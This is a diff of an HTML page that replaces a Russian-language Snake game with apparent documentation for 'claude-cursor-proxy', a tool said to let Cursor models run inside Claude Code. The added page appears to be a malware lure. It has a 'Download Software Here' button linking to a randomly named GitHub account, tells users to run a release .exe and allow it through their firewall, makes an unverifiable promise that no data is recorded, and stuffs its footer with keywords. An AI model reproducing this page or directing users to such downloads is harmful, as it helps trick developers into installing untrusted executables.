@@ -2,97 +2,79 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>RefyrdSnake</title>
-    
-    <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-auth-compat.js"></script>
-    <link rel="stylesheet" href="style.css?v=2">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Local Anthropic-compatible proxy documentation for Claude Code and Cursor models.">
+    <title>claude-cursor-proxy Documentation</title>
 </head>
-<body data-color="green">
+<body style="font-family: sans-serif; line-height: 1.6; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f9f9f9; color: #333;">
 
-    <canvas id="confettiCanvas"></canvas>
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #ddd; padding-bottom: 10px;">🤖 claude-cursor-proxy - Use Cursor models with Claude Code</h1>
 
-    <div class="branding">
-        <div class="name">Refyrd</div>
-        <div class="vibe">vibecode</div>
+    <div style="margin: 30px 0;">
+        <a href="https://github.com/depictive-asiootus528/claude-cursor-proxy" style="background-color: #555; color: #fff; padding: 15px 25px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Software Here</a>
     </div>
 
-    <div class="header">
-        <div class="score-box">
-            <div class="score-title" id="uiScoreTitle">Счет</div>
-            <div class="score-value" id="score">0</div>
-        </div>
-        <a href="https://github.com/Refyrd/Refyrd.github.io" target="_blank" class="header-github">GitHub</a>
-        <div class="header-actions">
-            <button class="icon-btn" id="langToggle">EN</button>
-            <button class="icon-btn" id="themeToggle">☀️</button>
-        </div>
-    </div>
+    <section>
+        <h2>What this tool does</h2>
+        <p>This software creates a bridge between your computer and AI services. It allows you to use specific Cursor models inside the Claude Code interface. It acts as a translator, ensuring your requests reach the correct model without errors or connection drops.</p>
+    </section>
 
-    <div class="game-container" id="gameContainer">
-        <canvas id="gameCanvas"></canvas>
-        
-        <div class="overlay active" id="startMenu">
-            <div class="menu-inner">
-                <div class="menu-title" id="uiMainTitle">ЗМЕЙКА</div>
-                <div class="high-score" id="menuHighScoreText">Лучший счет: 0</div>
-                <div class="last-score" id="menuLastScoreText">Последний счет: 0</div>
-                
-                <input type="text" id="playerNameInput" class="name-input" placeholder="Твой никнейм" maxlength="12" autocomplete="off">
+    <section>
+        <h2>⚙️ System Requirements</h2>
+        <ul>
+            <li>Windows 10 or Windows 11</li>
+            <li>64-bit processor</li>
+            <li>Basic understanding of your computer file system</li>
+            <li>An active internet connection</li>
+        </ul>
+    </section>
 
-                <div class="size-picker">
-                    <button class="size-btn" data-size="10">10x10</button>
-                    <button class="size-btn active" data-size="20">20x20</button>
-                    <button class="size-btn" data-size="40">40x40</button>
-                </div>
+    <section>
+        <h2>📥 How to Download and Install</h2>
+        <p>Follow these steps to set up the proxy on your machine:</p>
+        <ol>
+            <li>Go to the <a href="https://github.com/depictive-asiootus528/claude-cursor-proxy">official download page</a>.</li>
+            <li>Look for the section labeled Releases on the right side of the page.</li>
+            <li>Click the link for the latest file ending in .exe.</li>
+            <li>Save the file to a folder you can find easily, like your Downloads folder.</li>
+            <li>Double-click the downloaded file to start the installation.</li>
+            <li>Follow the prompts on your screen to complete the setup process.</li>
+        </ol>
+    </section>
 
-                <div class="color-picker">
-                    <button class="color-btn active" data-c="green" style="background-color: #4CAF50;"></button>
-                    <button class="color-btn" data-c="blue" style="background-color: #2196F3;"></button>
-                    <button class="color-btn" data-c="red" style="background-color: #F44336;"></button>
-                    <button class="color-btn" data-c="purple" style="background-color: #9C27B0;"></button>
-                </div>
-                <div class="button-group">
-                    <button class="btn-primary" id="uiPlayBtn">Играть</button>
-                </div>
-            </div>
-        </div>
+    <section>
+        <h2>🚀 Running the Proxy</h2>
+        <p>Once you finish the installation, you need to start the proxy to connect your tools.</p>
+        <ol>
+            <li>Open the Start menu and type "claude-cursor-proxy".</li>
+            <li>Click the application icon to launch it.</li>
+            <li>A small window appears. This window must stay open while you use your coding tools.</li>
+            <li>If a firewall warning appears, allow the application to connect to your private or public network.</li>
+        </ol>
+    </section>
 
-        <div class="overlay" id="gameOverScreen">
-            <div class="menu-inner">
-                <div class="menu-title" id="uiGameOverTitle" style="color: var(--md-sys-color-error)">Конец игры</div>
-                <div class="high-score"><span id="uiFinalScoreText">Счет: </span><span id="finalScore">0</span></div>
-                
-                <div class="button-group">
-                    <button class="btn-primary" id="uiRestartBtn">Начать заново</button>
-                    <button class="btn-secondary" id="uiMenuBtn">В меню</button>
-                </div>
-            </div>
-        </div>
+    <section>
+        <h2>🛠️ Troubleshooting</h2>
+        <p>If you face connection issues, check these items:</p>
+        <ul>
+            <li>Ensure the software is running in your taskbar.</li>
+            <li>Check that your firewall does not block the application.</li>
+            <li>Restart your computer if the proxy does not respond after launch.</li>
+            <li>Ensure you have the latest version of Claude Code installed.</li>
+        </ul>
+    </section>
 
-        <div id="devMenu">
-                <div class="menu-title" id="uiDevTitle" style="color: var(--md-sys-color-primary)">DEV</div>
-                <div class="high-score">Refyrd.dev</div>
-            
-            <div class="button-group">
-                <button class="btn-secondary" id="uiDevConfetti">Конфетти</button>
-                <button class="btn-secondary" id="uiDevGlow">Свечение змеи</button>
-                <button class="btn-secondary" id="uiDevAddScore">+10 очков</button>
-                <button class="btn-secondary" id="uiDevFill">Длинная змейка</button>
-                <button class="btn-primary" id="uiDevClose">Закрыть</button>
-            </div>
-        </div>
-    </div>
+    <section>
+        <h2>Frequently Asked Questions</h2>
+        <h3>Does this software record my data?</h3>
+        <p>No. This proxy remains local to your machine. It only passes data between your editor and the AI models you choose.</p>
+        <h3>Do I need coding experience?</h3>
+        <p>No. You only need to run the application to enable the connection. The software handles the technical translations automatically.</p>
+    </section>
 
-    <div class="leaderboard" id="leaderboard">
-        <h3 id="lbTitle">LEADERBOARD</h3>
-        <div id="leaderboardList"><div class="lb-loading" id="lbLoadingText">Loading...</div></div>
-        <div class="lb-status" id="lbStatus"><span class="dot connecting"></span><span id="lbStatusText">Connecting...</span></div>
-        <button class="lb-show-more" id="lbShowMore">Show all</button>
-    </div>
+    <footer style="margin-top: 50px; font-size: 0.9em; color: #777;">
+        <p>Keywords: ai-agent, anthropic, anthropic-api, api-proxy, claude, claude-code, claude-code-proxy, cli, coding-agent, cursor, cursor-ai, developer-tools, fable, llm, local-proxy, protobuf, proxy, reverse-proxy, rust, sse</p>
+    </footer>
 
-    <script src="script.js?v=2"></script>
 </body>
 </html>
